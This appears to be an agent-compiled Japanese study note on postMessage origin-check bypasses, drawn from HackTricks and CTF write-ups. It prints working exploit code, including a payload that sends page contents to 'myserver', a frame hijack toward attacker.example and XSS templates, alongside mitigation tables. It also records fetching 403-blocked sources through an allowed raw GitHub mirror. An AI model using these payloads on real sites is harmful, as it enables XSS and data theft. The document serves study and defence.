#### SOP bypass 2（window.origin === null）（逐語訳）

**`allow-popups`** が設定されていると、開いたポップアップは `allow-popups-to-escape-sandbox` も設定されない限り sandbox 制約を継承する。したがって opaque-origin iframe からポップアップを開くと、ポップアップも opaque origin のまま sandbox される。

#### Challenge Solution（逐語訳）

このチャレンジでは、sandboxed iframe を作り、それを使って `/iframe.php` をポップアップで開く。比較される両 origin 文字列が `null` になるため、攻撃者は unsafe な `innerHTML` 代入に届くペイロードを送れる。最初の XSS で `identifier` を取得し、2 つ目の XSS ペイロードをトップページへ送り返す。トップページは `/iframe.php` へ navigate する。2 回目の配送では、`identifier` を知っていることで `data.identifier === identifier` が真になり、送信元 origin が一致しなくても甘い検証の別条件を満たす。XSS が対象オリジンで実行される。

#### コード（原文のまま逐語）— 完全なペイロードとタイミング

```html
<body>
  <script>
    f = document.createElement("iframe")

    // Needed flags
    f.sandbox = "allow-scripts allow-popups allow-top-navigation"

    // Second communication with /iframe.php (this is the top page relocated)
    // This will execute the alert in the correct origin
    const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
      x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
    },1000);`.replaceAll("\n", " ")

    // Initial communication
    // Open /iframe.php in a popup, both iframes and popup will have "null" as origin
    // Then, bypass window.origin === e.origin to steal the identifier and communicate
    // with the top with the second XSS payload
    f.srcdoc = `
    <h1>Click me!</h1>
    <script>
      onclick = e => {
        let w = open('https://so-xss.terjanq.me/iframe.php');
        onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
        setTimeout(_ => {
          w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
        }, 1000);
      };
    <\/script>
    `
    document.body.appendChild(f)
  </script>
</body>
```

#### References（子ページ A、逐語）
- [1] soXSS - writeup: https://github.com/terjanq/same-origin-xss
- [2] WHATWG HTML - sandboxed origin and popup sandboxing flags: https://html.spec.whatwg.org/multipage/origin.html#sandboxing-flag-set
- [3] NDevTK: https://github.com/NDevTK
- [4] Terjanq: https://github.com/terjanq

### 子ページ B: Bypassing SOP with Iframes - 2（`bypassing-sop-with-iframes-2.md`）（出典: 同ディレクトリ）

SekaiCTF 2022「obligatory-calc」の解法（@Strellic_）。攻撃者は次のチェックを**バイパス**する必要がある。

#### コード（原文のまま逐語）— バイパス対象のチェック

```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```

バイパスできれば、HTML コンテンツ入りの postmessage を送り、サニタイズなしで `innerHTML` に書かれて XSS になる。

**第1チェックのバイパス**（逐語訳）: `window.calc.contentWindow` を `undefined` に、`e.source` を `null` にする。
- `window.calc.contentWindow` は実質 `document.getElementById("calc")`。`document.getElementById` は **`<img name=getElementById />`** で DOM クロバリングできる。
  - よって `document.getElementById("calc")` を `<img name=getElementById /><div id=calc></div>` でクロバリングすると、`window.calc` は `undefined` になる。
  - 次に `e.source` を `undefined` か `null` にする必要がある（`===` でなく `==` が使われているので `null == undefined` は `true`）。チャレンジのブラウザ挙動では、iframe からメッセージを送信し**直後にその iframe を削除**すると、キューされたイベントの `source` が `null` として観測される（シリアライズされた `origin` は別プロパティ）。

#### コード（原文のまま逐語）— e.source を null にする手順

```javascript
let iframe = document.createElement("iframe")
document.body.appendChild(iframe)
window.target = window.open("http://localhost:8080/")
await new Promise((r) => setTimeout(r, 2000)) // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)
document.body.removeChild(iframe) // the receiver observes e.source === null
```

**第2チェック（token）のバイパス**（逐語訳）: `token` を値 `null` で送り、`window.token` を `undefined` にする。
- postMessage で `token` を値 `null` で送るのは自明。
- `window.token` は `document.cookie` を読む `getCookie` 関数で代入される。sandboxed opaque-origin コンテキストで cookie にアクセスするとチャレンジ内でエラーになり、`window.token` は `undefined` のまま残る。

@terjanq による最終解（逐語）:

#### コード（原文のまま逐語）— calc.html 最終解

```html
<html>
  <body>
    <script>
      // Abuse "expr" param to cause a HTML injection and
      // clobber document.getElementById and make window.calc.contentWindow undefined
      open(
        'https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"'
      )

      function start() {
        var ifr = document.createElement("iframe")
        // Create a sandboxed iframe, as sandboxed iframes will have origin null
        // this null origin will document.cookie trigger an error and window.token will be undefined
        ifr.sandbox = "allow-scripts allow-popups"
        ifr.srcdoc = `<script>(${hack})()<\/script>`

        document.body.appendChild(ifr)

        function hack() {
          var win = open("https://obligatory-calc.ctf.sekai.team")
          setTimeout(() => {
            parent.postMessage("remove", "*")
            // this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
            // token=null equals to undefined and e.source will be null so null == undefined
            win.postMessage(
              {
                token: null,
                result:
                  "<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>",
              },
              "*"
            )
          }, 1000)
        }

        // this removes the iframe so e.source becomes null in postMessage event.
        onmessage = (e) => {
          if (e.data == "remove") document.body.innerHTML = ""
        }
      }
      setTimeout(start, 1000)
    </script>
  </body>
</html>
```

#### 2025 Null-Origin Popups (TryHackMe - Vulnerable Codes)（逐語訳）

最近の TryHackMe タスク「Vulnerable Codes」は、opener が「scripts と popups だけを許す」sandboxed iframe 内にいるとき OAuth ポップアップがハイジャックされうることを示す。iframe は自身とポップアップの両方を `"null"` origin に強制するため、`if (origin !== window.origin) return` をチェックするハンドラは、ポップアップ内の `window.origin` も `"null"` であるために沈黙して失敗する。ブラウザは実際の `location.origin` を依然公開するが、被害者はそれを検査しないため、攻撃者制御メッセージが通り抜ける。

#### コード（原文のまま逐語）

```javascript
const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts allow-popups';
frame.srcdoc = `
  <script>
    const pop = open('https://oauth.example/callback');
    pop.postMessage({ cmd: 'getLoginCode' }, '*');
  <\/script>`;
document.body.appendChild(frame);
```

Takeaways（逐語訳）:
- ポップアップ内で `origin` を `window.origin` と比較するハンドラは、両方が `"null"` と評価されるためバイパスでき、偽造メッセージが正当に見える。
- `allow-popups` を与えつつ `allow-same-origin` を欠く sandbox は、`allow-popups-to-escape-sandbox` も無い限り sandbox 制約をポップアップへ伝播しうる。結果の origin と opener 関係はフラグ依存なので、実際の navigation とブラウザでテストすること。

#### Source-nullification & frame-restriction bypasses（逐語訳）

CVE-2024-49038 周辺の業界 writeup は、このページに再利用可能な 2 つのプリミティブを示す: (1) `X-Frame-Options: DENY` を設定するページでも `window.open` で起動し navigation 完了後にメッセージを送れば依然やり取りできる、(2) メッセージ送信直後に iframe を削除して受信側に `null` のみを見せることで `event.source == victimFrame` チェックを総当りできる。

#### コード（原文のまま逐語）

```javascript
const probe = document.createElement('iframe');
probe.sandbox = 'allow-scripts';
probe.onload = () => {
  const victim = open('https://target-app/');
  setTimeout(() => {
    probe.contentWindow.postMessage(payload, '*');
    probe.remove();
  }, 500);
};
document.body.appendChild(probe);
```

（逐語訳）上の DOM クロバリングトリックと組み合わせる: 受信側が `event.source === null` しか見なくなれば、`window.calc.contentWindow` 等との比較が崩れ、再び `innerHTML` シンクに悪意 HTML を通せる。

#### References（子ページ B、逐語）
- [1] PostMessage Vulnerabilities: When Cross-Window Communication Goes Wrong: https://instatunnel.my/blog/postmessage-vulnerabilities-when-cross-window-communication-goes-wrong
- [2] THM Write-up: Vulnerable Codes: https://fatsec.medium.com/thm-write-up-vulnerable-codes-9ea8fe8464f9
- [3] SekaiCTF 2022 - obligatory-calc solution: https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution
- [4] obligatory-calc final solution (calc.html) by @terjanq: https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html
- [5] WICG Sanitizer API - DOM clobbering considerations: https://wicg.github.io/sanitizer-api/index.html#dom-clobbering

### 子ページ C: Blocking the Main Page to Steal a `postMessage`（`blocking-main-page-to-steal-postmessage.md`）（出典: 同ディレクトリ）

原文（逐語訳）: Terjanq writeup によると、`null` origin から作られた blob 文書は親ページから**プロセス分離**されうる。これで興味深いレースが可能になる: **親**ウィンドウを同期コードパスで十分な時間拘束できれば、悪意ある**子**文書は動き続け、JS のブートストラップを終え `onmessage` を登録し、次の機微な `postMessage` を盗める。

簡略化された脆弱フロー:

#### コード（原文のまま逐語）

```javascript
iframe.addEventListener(
  "load",
  () => {
    iframe.contentWindow?.postMessage(secret, "*")
  },
  { once: true }
)

window.addEventListener("message", (e) => {
  if (e.data == "blob loaded") {
    $("#previewModal").modal()
  }
})
```

（逐語訳）攻撃者の目標は、**親に iframe を作らせる**が、親が機密データを**送る前に**親を忙しくさせ、子 iframe にペイロードを送ること。親が忙しい間に iframe は攻撃者 JS を実行し `onmessage` を仕込み、次の機密 `postMessage` を待つ。親が応答可能に戻るとシークレットを送り、悪意ある子がそれをリークする。

実際的なフロー（逐語訳）:
1. 被害者に対象 iframe を作成/ロードさせる。
2. 子が存在した時点を検知（`win.length === 1`、`frames.length > 0` など）。
3. 親の**高コスト同期ガジェット**に届くメッセージを送る。
4. 親のイベントループが停止している間に、子 iframe にペイロードを送る。
5. ペイロードに、親が子へ送る次のシークレットをリークさせる。

#### Blocking gadgets（ブロッキングガジェット）（逐語訳）

元の 2022 チャレンジは**緩い比較（loose comparison）**ガジェットを使った:

```javascript
window.addEventListener("message", (e) => {
  if (e.data == "blob loaded") {
    $("#previewModal").modal()
  }
})
```

`==` は非文字列を型強制するため、大きな `Uint8Array`/`ArrayBuffer` は、親が攻撃者制御データを文字列へ変換するのに顕著な時間を費やさせられる:

```javascript
const buffer = new Uint8Array(1e7)
victim.postMessage(buffer, "*", [buffer.buffer])
```

（逐語訳）`ArrayBuffer` を**転送リスト（transfer list）**で渡すと所有権が転送され、内容をコピーせず送信側から detach される。これが受信側で有用な遅延を生むかはブラウザ・サイズ・ガジェット依存。

最近の Postviewer 変種では、**親の `message` ハンドラから到達可能な任意の攻撃者制御同期処理**で十分なことが示された。狙うべき例は、攻撃者制御長のループやデバッグの残り物:

```javascript
window.onmessage = (e) => {
  if (e.data.type === "share") {
    for (let i = 0; i < e.data.files.length; i++) {
      // expensive per-file work
    }
  }

  if (e.data.slow) {
    for (let i = 0; i < e.data.slow; i++) {}
  }
}
```

（逐語訳）監査時は `==` の型強制ガジェットだけでなく、攻撃者制御の `length` フィールドに対するループ、デバッグの残り物、機密 `postMessage` が送られる**前に**到達可能な任意の同期パスも探すこと。概念的にはこれは busy event loop XS-Leaks と同じ単一スレッドプリミティブを悪用するが、ここでは親が再開する前に悪意ある子を仕込むのが目的。

#### Timing the race（レースのタイミング）（逐語訳）

レースの窓は通常わずか数ミリ秒なので、遅いガジェットを撃つ前に安価な同期シグナルを使う:
- `win.length === 1` / `frames.length > 0` をポーリングして子の存在を知る。
- 試行間で単一のポップアップ/ウィンドウを再利用し navigation ジッタを減らす。
- 攻撃対象のブラウザ/ハードウェアに合わせて小さな `setTimeout` 遅延を経験的に調整する。
- 被害者がワイルドカード `postMessage(..., "*")` を使うなら、子ペイロードが確実に仕込まれるまで送り続ける。

#### Popup / non-frameable variant（ポップアップ／フレーム化不可の変種）（逐語訳）

同じアイデアの 2025 年の進化が **Postviewer v5²** に現れた。対象ページが**フレーム化不可**の場合でも、**ポップアップ**からレースを勝てた。`iframe.location` を直接変える代わりに、攻撃者は**自身を継続的にリロード**する子/ポップアップペイロードを使い、被害者がリスナをクリーンアップする直前に別の `onload` を作った:

```html
<script>
setTimeout(() => {
  location = URL.createObjectURL(
    new Blob([document.documentElement.innerHTML], { type: "text/html" })
  )
}, 150)
</script>
```

これによりプリミティブは次のようになる（逐語訳）:
1. 対象をポップアップで開く。
2. 被害者に自己リロードする攻撃者制御文書を描画させる。
3. `onmessage` を仕込み次のシークレットをリークするだけの 2 つ目のペイロードを描画。
4. 上のブロッキングガジェットで opener/メインページを停止。
5. opener が再開すると、子のクリーンアップ/ack メッセージを処理する**前に**、機密 `postMessage` を攻撃者ペイロードへ配送しうる。

`window.open()` フローしか制御できない場合や、フレーム制約でネスト iframe の location を直接ハイジャックできない場合に有用。

#### Defensive checks（防御的チェック）（逐語訳）

このレースは、文書が攻撃者制御になりうるウィンドウへ機密メッセージが送られるときにのみ問題になる。`"*"` の代わりに正確な `targetOrigin` を使う、受信時に `event.origin` と `event.source` の両方を検証する、信頼できない入力を同期的な送信前ハンドラから遠ざける、シークレットを解放する前に宛先ウィンドウの期待ライフサイクルを再確認する。これらはブラウザ版でタイミングが変わっても信頼の失敗に対処する。

#### References（子ページ C、逐語）
- [1] Terjanq writeup - Winning RCs with Iframes: https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710
- [2] Terjanq writeup - Postviewer v5² (Google CTF 2025): https://gist.github.com/terjanq/e66c2843b5b73aa48405b72f4751d5f8
- [3] MDN - `Window.postMessage()` security and transferable-object guidance: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage

### 子ページ D: Stealing `postMessage` Data by Navigating an Iframe（`steal-postmessage-modifying-iframe-location.md`）（出典: 同ディレクトリ）

原文（逐語訳）: 攻撃者が `X-Frame-Options` や CSP `frame-ancestors` で保護されていないページをフレーム化でき、そのページがネストした iframe を含むとする。クロスオリジンスクリプトはネスト文書を読めないが、ブラウザのクロスオリジンインターフェースは限定的な `Window` と `Location` アクセスを公開する: `window.frames` は読め、参照したウィンドウの location は書ける。

（逐語訳）この挙動は、ネスト文書が `postMessage(..., "*")` で機密データを受け取るとき、データ露出プリミティブになりうる。攻撃者がメッセージ送信前に、意図された受信フレームを攻撃者制御オリジンへ navigate すれば、ワイルドカード `targetOrigin` により差し替え文書がメッセージを受け取れる。MDN と OWASP はいずれも可能な限り `*` でなく期待する正確な origin を指定するよう推奨する。

（逐語訳）同じ根底のレースは、攻撃者がウィンドウ参照を保持しブラウザがそのクロスオリジン navigation を許す限り、子・親・opener ウィンドウを巻き込みうる。重要な条件は navigation タイミングの制御と、ワイルドカードまたは誤った `targetOrigin` を使う送信側。

（逐語訳）以下の PoC 構造は Google VRP writeup を改変したもの。フレームインデックスと navigation 許可は文書ツリーとブラウザ挙動で変わるので、インデックスを盲目的にコピーせず実際の階層を検査すること。

#### コード（原文のまま逐語）

```html
<!doctype html>
<html lang="en">
  <body>
    <iframe src="https://docs.google.com/document/ID"></iframe>
    <script>
      setTimeout(() => {
        // Retry because the nested frame may be created asynchronously.
        setInterval(() => {
          window.frames[0].frames[0].frames[2].location =
            "https://attacker.example/exploit.html"
        }, 100)
      }, 6000)
    </script>
  </body>
</html>
```

#### Mitigation（緩和策）（逐語訳）
- 機密メッセージは正確な `targetOrigin` でのみ送る。
- 受信時に `event.origin` と、適切な場合は `event.source` を検証する。
- CSP `frame-ancestors`（およびレガシー互換のため `X-Frame-Options`）で不正な framing を防ぐ。

#### References（子ページ D、逐語）
- [1] MDN - Same-origin policy: cross-origin script API access: https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#cross-origin_script_api_access
- [2] MDN - `Window.postMessage()`: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
- [3] OWASP HTML5 Security Cheat Sheet - Web Messaging: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging
- [4] GeekyCat - Google VRP: Hijacking Google Docs Screenshots: https://blog.geekycat.in/posts/hijacking-google-docs-screenshots/

---

## origin 検証バイパス手法まとめ表（原文の要点を表化・診断/防御用）

| 手法 | 何が起きるか | 悪い実装例 / トリガー | 対策 |
|---|---|---|---|
| `event.isTrusted` を認可に使用 | JS の `dispatchEvent` か否かしか示さず、信頼オリジン由来を証明しない | `if(!e.isTrusted) return` を origin 検証代わりに使う | `event.origin`（必要なら `event.source`）を検証 |
| `indexOf()` 部分一致 | 攻撃者ドメインに信頼文字列を含めれば通過 | `origin.indexOf("https://app-sj17.ma")` | 完全一致（`===`）またはホスト分解して比較 |
| `String.prototype.search()` | 引数が正規表現化され `.` がワイルドカード化 | `origin.search("www.s.fedomain.com")` | 正規表現を使わず厳密文字列比較 |
| `match()` | 正規表現の構造ミスでバイパス | 甘い正規表現 | アンカー付き厳密正規表現 or 完全一致 |
| `escapeHtml` の上書き挙動 | 既存オブジェクトのプロパティ上書き。`hasOwnProperty` を持たない／`File.name` は非サニタイズ | `u(new Error(...))`、`File` オブジェクト | サニタイズ後の新規オブジェクトを生成、テンプレートで読み取り専用プロパティを信頼しない |
| `document.domain` 緩和 | 同一親ドメイン内で SOP を緩和 | `document.domain="example.com"` | `document.domain` を使わない設計 |
| substring scheme チェック | `http:` 含有チェックだけを行い scheme を制約しない | `javascript:print()//http:` | scheme を明示検証、`javascript:` 拒否 |
| origin-only 信頼 + リレー | 信頼オリジン上の反射/リレーページ経由でメッセージ偽装 | `*.trusted.com` 全許可 | メッセージ構造・種別・送信元を厳密検証 |
| `e.origin == window.origin`（null==null） | sandbox iframe/ポップアップの `origin=null` 一致 | `sandbox="allow-scripts"`（allow-same-origin なし） | `null` origin を明示的に拒否 |
| `e.source` の null 化 | 送信直後 iframe 削除で `source===null` | `e.source !== window` / `e.source == calc.contentWindow` | `event.source` を保持し厳密比較、ライフサイクル確認 |
| DOM クロバリング | `document.getElementById` を `<img name=getElementById>` で乗っ取り、`window.calc.contentWindow` を `undefined` 化 | `<img name=getElementById /><div id=calc>` | 名前付き要素に依存しない参照取得 |
| trusted-origin allowlist | 信頼 partner の XSS → 親への postMessage 橋渡し | partner iframe XSS + `innerHTML` シンク | partner を境界とみなさない、シンクを無害化 |
| `Math.random()` トークン予測 | PRNG 出力を `window.name` からリークし次の GUID を予測 | `guid(){return "f"+(Math.random()*(1<<30)).toString(16)...}` | 暗号学的乱数（`crypto.getRandomValues`）を使う |

---

## 送信側 targetOrigin の挙動まとめ表

| targetOrigin | ブラウザの配信条件 | セキュリティ上の意味 |
|---|---|---|
| `'*'`（ワイルドカード） | 対象ウィンドウの現在 origin に関係なく配信 | 攻撃者オリジンへ navigate 済みのフレームにも届く＝漏洩リスク。窃取系攻撃の前提条件 |
| 正確なオリジン（例 `https://company.com`） | 対象ウィンドウが**現在その origin を持つときのみ**配信 | location 書き換え窃取トリックは効かない（推奨） |

---

## 補完で回収した一次資料（GitHub raw ミラー等・逐語）

> 本節は「補完担当エージェント」が、前工程で failed だった外部 URL のうち **GitHub にソース／ミラーが存在するもの**を許可ホスト `raw.githubusercontent.com` から回収した一次資料。403 ブロックされた本体ホストへの再試行はしていない。各項目に取得元 raw URL を明記する。

### R1. MDN『Window: postMessage() method』（[10]/[参照] の一次資料）

取得元: `https://raw.githubusercontent.com/mdn/content/main/files/en-us/web/api/window/postmessage/index.md`（原本: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage ／ egress 403 のため raw から回収）

**`targetOrigin` の正確な仕様（逐語訳）**:
- `targetOrigin` は受信ウィンドウが持つべき origin を指定する。イベントが配送されるには origin が**完全一致（scheme・hostname・port すべて）**する必要がある。省略時の既定は `"/"`（メソッドを呼んだ側の origin）。
- パスワード等を送るなら、この引数を**意図した受信者と同一オリジンの URI にすることが絶対的に重要**（第三者による傍受を防ぐ）。
- `*` も指定でき、その場合**任意の origin のリスナへ配送されうる**。
- 公式 NOTE（逐語）: 「相手ウィンドウの文書位置が分かっているなら、常に `*` ではなく具体的な `targetOrigin` を指定せよ。指定しないと悪意あるサイトへデータを開示しうる。」
- `data:` URL は opaque origin を持つため、`data:` URL のコンテキストへ送るには `"*"` を指定するしかない。

**dispatch されるイベントのプロパティ（逐語訳）**:
- `data`: 相手ウィンドウから渡されたオブジェクト。
- `origin`: `postMessage` が呼ばれた**時点**の送信元ウィンドウの origin（protocol + `://` + host + 必要なら `:port`）。**注意: この origin は当該ウィンドウの現在／将来の origin である保証はない**（`postMessage` 呼び出し後に別ページへ navigate されている可能性）。
- `source`: メッセージを送った `window` への参照。双方向通信の確立に使える。

**Security concerns（逐語・原文引用）**:
> **If you do not expect to receive messages from other sites, _do not_ add any event listeners for `message` events.** This is a completely foolproof way to avoid security problems.
>
> If you do expect to receive messages from other sites, **always verify the sender's identity** using the `origin` and possibly `source` properties. Any window (including, for example, `http://evil.example.com`) can send a message to any other window within the iframe hierarchy from top to every iframe below of the current document. Having verified identity, however, you still should **always verify the syntax of the received message**. Otherwise, a security hole in the site you trusted to send only trusted messages could then open a cross-site scripting hole in your site.
>
> **Always specify an exact target origin, not `*`, when you use `postMessage` to dispatch data to other windows.** A malicious site can change the location of the window without your knowledge, and therefore it can intercept the data sent using `postMessage`.

**教科書に効く追加ニュアンス（MDN「Notes」より逐語訳）**:
- `postMessage()` 呼び出し後、`MessageEvent` は**保留中の実行コンテキストがすべて終了した後にのみ**dispatch される（イベントハンドラ内で呼ぶと、そのハンドラと同一イベントの残りのハンドラが完了してから配送）。→ これは子ページ C の「busy event loop レース」プリミティブの理論的裏付け。
- dispatch されるイベントの `origin` の値は、**呼び出し側ウィンドウの現在の `document.domain` の値に影響されない**（§3.2 の `document.domain` 緩和と併せて理解する）。
- 送信側ウィンドウが `javascript:` または `data:` URL を含む場合、`origin` プロパティの値は**その URL を読み込んだスクリプトの origin**になる（§3.3 の javascript URL シンクと関連）。
- IDN ホスト名では `origin` が Unicode か punycode か一貫しないので、両形式をチェックせよ。
- 拡張（chrome コード）で受けると `source` は**常に `null`**（セキュリティ制限）。→ §3.6 の「e.source を null 化するバイパス」と挙動が重なる点に注意。
- `file:` URL のページへ dispatch するには現状 `targetOrigin` を `"*"` にする必要がある。`file://` はセキュリティ制限に使えない。
- `SharedArrayBuffer` を送るには cross-origin isolation（`Cross-Origin-Opener-Policy: same-origin` + `Cross-Origin-Embedder-Policy: require-corp`）が必要。

**MDN 記載の受信ハンドラ手本（逐語）**:
```js
window.addEventListener("message", (event) => {
  // Do we trust the sender of this message?
  if (event.origin !== "http://example.com:8080") return;
  // event.source is window.opener
  // event.data is "hello there!"
  event.source.postMessage(
    "hi there yourself! the secret response is: rheeeeet!",
    event.origin,   // 返信は event.source に対し targetOrigin=event.origin を使うのが定石
  );
});
```

### R2. OWASP『HTML5 Security Cheat Sheet — Web Messaging』（[参照]の一次資料）

取得元: `https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/HTML5_Security_Cheat_Sheet.md`（原本: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging ／ egress 403 のため raw から回収）

**Web Messaging 節（逐語・要点保持の訳＋原文の重要文引用）**:
- 送信時は第2引数に**期待する origin を明示**し `*` を使わない（リダイレクト等で対象ウィンドウの origin が変わった後に未知 origin へ送るのを防ぐ）。
- 受信ページは**常に**次を行う:
  - 送信元の `origin` 属性をチェックし、データが期待する場所から来たことを検証。
  - イベントの `data` 属性に**入力検証**を行い、期待する形式か確認。
- `data` 属性を自分の制御下にあると仮定するな。送信ページの XSS 1 個で、攻撃者は任意形式のメッセージを送れる。
- **両ページはメッセージを「データ」としてのみ解釈せよ。`eval()` で評価したり `innerHTML` で DOM に挿入するな**（DOM based XSS になる）。
- 値を要素へ代入するときは `element.innerHTML=data;` のような危険な方法でなく `element.textContent=data;` を使う。
- origin を **FQDN に完全一致**でチェックせよ。原文引用の反例:
  > Note that the following code: `if(message.origin.indexOf(".owasp.org")!=-1) { /* ... */ }` is very insecure and will not have the desired behavior as `owasp.org.attacker.com` will match.
  （＝ `indexOf(".owasp.org")` は `owasp.org.attacker.com` にマッチしてしまう＝§3.2 の indexOf バイパスと同型。）
- 信頼できない外部コンテンツ／ガジェットを埋め込みユーザー制御スクリプトを許すのは強く非推奨。必要なら sandboxed frames を参照。

（同シートの関連近接節も併せて回収: **Server-Sent Events** は「`event.origin` を常にチェックし allow-list で信頼ドメインを確認」「`event.data` をデータとして扱いコードとして評価しない」と postMessage と同旨。**CORS** は「`Origin` ヘッダのみに Access Control を頼るな（ブラウザ外で spoof 可能）」。）

### R3. terjanq『soXSS — writeup』全文回収（[子ページA 参照][1] の一次ソース）

取得元: `https://raw.githubusercontent.com/terjanq/same-origin-xss/master/README.md`（原本: https://github.com/terjanq/same-origin-xss ／ github.com 本体は egress 403、raw は許可）

子ページ A の内容（脆弱ハンドラ、null origin 二段バイパス、最終 PoC）は本 README と**逐語一致**を確認した。子ページには無かった**「The solution」節の背景説明**を一次ソースから補う（逐語訳）:

- チャレンジは (1) HTML ノート用テキスト入力、(2) textarea を iframe 内でレンダリングする 2 コンポーネントから成り、iframe は同一オリジンだが送信データは **DOMPurify** でサニタイズされる。
- `identifier` は**ユーザーのセッションに保存**され、セッション cookie は **`Lax`**。
- 意図解: `e.origin !== window.origin` チェックのバイパスが本丸。`//example.org` を **sandboxed iframe** に埋め込むとページの origin は `null`（`window.origin === 'null'`）になる。ただし単純な `<iframe sandbox="allow-scripts" src=...>` 方式は、**ページが埋め込み可能かつ cookie が `SameSite=None`** のときだけ成立し、本チャレンジではそうでなかった。
- あまり知られていない事実: sandbox 値に **`allow-popups`** を付けると、開いたポップアップは **`allow-popups-to-escape-sandbox` が無い限り sandbox 属性をすべて継承**する。これが解法:
  1. sandboxed ページからポップアップで `/iframe.php` を開く。
  2. 別の `null` origin から単純 XSS をポップアップへ送り identifier を盗む。
  3. `/iframe.php` を開き、盗んだ identifier 付き XSS を送る（origin が `so-xss.terjanq.me` になる）。
- 作者: NDevTK と terjanq。PoC は `https://so-xss-hof.terjanq.me/poc.html`（コードは子ページ A に逐語収録済み）。

### R4. 参照ツール README（列挙・予測・recon）

前工程で failed だった参照ツールリンクのうち GitHub 上のものを回収。

**Posta**（取得元 `raw.githubusercontent.com/benso-io/posta/main/README.md`）— enso.security 製の Chrome 拡張。cross-document messaging（`postMessage`）を**追跡・探索・悪用**するツール。
- **Tabs**: メイン origin と、それがホスト／通信する iframe を一覧。フレームを選ぶとそのフレーム関連の postMessage のみ観察できる。
- **Messages**: origin↔iframe 間の全 postMessage トラフィックを検査。Listeners 領域に通信を処理するコードが表示され、クリックしてコピー可能。
- **Console**: 元の postMessage を改変し、改ざん値で**リプレイ**送信できる（Origin→iframe）。
- 開発モードにテスト用サイトと exploit ページ（`http://localhost:8080/exploit/`）が付属。

**postMessage-tracker**（取得元 `.../fransr/postMessage-tracker/master/README.md`）— Frans Rosén 作。OWASP AppSec EU 2018「Attacking modern web technologies」で発表、2020年5月公開の Chrome 拡張。
- 現在ウィンドウの **listener 数インジケータ**を表示。**全サブフレーム**の listener を追跡。
- **短命な listener／インタラクションで有効化される listener**も追跡（iframe 内で一瞬だけ有効になる隠れ listener の発見に有用）。
- listener の関数と場所を **Log URL** でログ出力し後から精査可能。
- **Raven / New Relic / Rollbar / Bugsnag / jQuery のラッパを "unpack"** して実 listener を DevTools に表示。匿名関数は `bound` として表示。
- ウィンドウ間通信をコンソールに表示し、**リプレイ用のパス**を提示（`diffwin` を sender/receiver に使える）。

**eventlistener-xss-recon**（取得元 `.../yavolo/eventlistener-xss-recon/master/README.md`）— リスナ列挙の**recon 方法論**。
- JS 収集＋正規表現マッチ:
  ```bash
  cat hosts | getJS | grep target.com | httpx --match-regex "(?i)addEventListener\((?:'|\")message(?:'|\")"
  cat hosts | hakrawler -plain | httpx --match-regex "(?i)addEventListener\((?:'|\")message(?:'|\")"
  ```
  `grep target.com` で公開 CDN を除外（保守されており悪用困難）。自前配信 `static.target.com` 等の**古いサードパーティ JS** が狙い目。
- Chrome DevTools: **Sources タブ → Global Listeners → message** で登録済み message リスナを列挙。listener にブレークポイントを置き、コンソールから `window.postMessage('test','*')` を撃って `if()`/regex を潜り抜けてシンクに到達するか観察。
- Burp の DOM Invader（埋め込みブラウザ）も同様機能。
- exploit テンプレ（repl.it 等・逐語）:
  ```html
  <script>
  var target = document.getElementById('target')
  target.addEventListener('load', () => {
    target.contentWindow.postMessage({
      "type": "redacted",
      "data": "<script>alert(document.domain)<\/script>"}, '*')
  })
  target.src = "https://test.target.com/search?q=yavolo"
  </script>
  ```

**v8-randomness-predictor**（取得元 `.../PwnFunction/v8-randomness-predictor/main/README.md`）— §3.13 の `Math.random()` 予測の**実装ワークフロー**を補完（Z3 で V8 の `Math.random` を予測）。
1. v8（d8/Node/Chrome）で乱数を数個取得: `Array.from(Array(5), Math.random)`。（Node は `--random_seed=1337` で再現可能。）
2. 得た乱数列を**逆順**に Python スクリプト（`main.py` の `sequence`）へ投入。
   ```py
   sequence = [0.9311600617849973, 0.3551442693830502, 0.7923158995678377,
               0.787777942408997, 0.376372264303491][::-1]
   ```
3. `python3 main.py` を実行すると内部状態 `{'se_state1':..., 'se_state0':...}` を復元し**次の乱数**を出力。
- 原理は V8 の xorshift128+（`Math.random` は状態から生成）。参考: v8.dev/blog/math-random。
- ノートの §3.13（FB SDK の `guid()` 予測）はまさにこの手法で「次の `guid()`＝コールバックトークン」を先読みする。solver へは**非連続な複数値**でも投入でき、内部で余分に消費される `Math.random()` 値をスキップして辻褄を合わせる。

---

## 読者が自分で開くべき資料

hacktricks.wiki 本体と、原文が参照する外部 writeup の一部は**本環境の egress ポリシーで 403 ブロック**される。**補完で MDN・OWASP・terjanq soXSS・参照ツール4本は GitHub raw から full 回収済み**（上記「## 補完で回収した一次資料」参照）。以下は**なお回収できていない一次資料**（jlajara / ysamm×4 / PortSwigger ラボ）と、full 回収済みでも本体で確認する価値がある資料の読みどころ。捏造補完はしておらず、未回収分は本文に取り込んでいない。本ノート本文は GitHub 上の同一原文 Markdown から full 取得済みだが、以下の一次資料は読者自身がアクセスして深掘りすべき「読みどころ」を挙げる。

- **HackTricks 本体ページ** — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html
